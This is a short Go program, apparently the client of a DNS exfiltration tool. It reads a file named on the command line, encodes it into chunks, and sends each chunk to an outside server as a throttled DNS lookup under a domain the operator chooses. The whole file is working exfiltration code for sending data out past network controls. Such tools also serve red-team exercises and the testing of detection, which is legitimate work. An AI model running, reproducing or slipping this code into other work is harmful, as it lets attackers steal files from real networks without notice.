package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/jpicht/exfil/lib/exfil"
	"github.com/miekg/dns"
)

const verbose = false
const throttle = 50 * time.Millisecond
const resolver = ""

func check(err error) {
	if err != nil {
		failed(err)
	}
}

func failed(err error) {
	fmt.Fprintf(os.Stderr, "Error: %s\n", err)
	os.Exit(2)
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintln(os.Stderr, "Syntax:")
		fmt.Fprintf(os.Stderr, "    %s <domain> <file>\n", os.Args[0])
		os.Exit(1)
	}

	var domain = os.Args[1]
	if domain[0] != '.' {
		domain = "." + domain
	}

	var fileName = os.Args[2]

	c, err := exfil.EncodeFile(fileName)
	check(err)
	if verbose {
		fmt.Println("Sending file " + fileName)
	} else {
		fmt.Print("Sending file: ")
	}
	cl := new(dns.Client)
	for payload := range c {
		if verbose {
			fmt.Println("\t" + payload + domain)
		} else {
			os.Stdout.Write([]byte("."))
		}

		if resolver == "" {
			net.LookupHost(payload + domain)
		} else {
			m := new(dns.Msg)
			m.SetQuestion(payload+domain, dns.TypeA)
			_, _, err := cl.Exchange(m, resolver)
			if err != nil {
				if !verbose {
					fmt.Println()
				}
				check(err)
			}
		}

		time.Sleep(throttle)
	}

	if !verbose {
		fmt.Println("")
	}
}
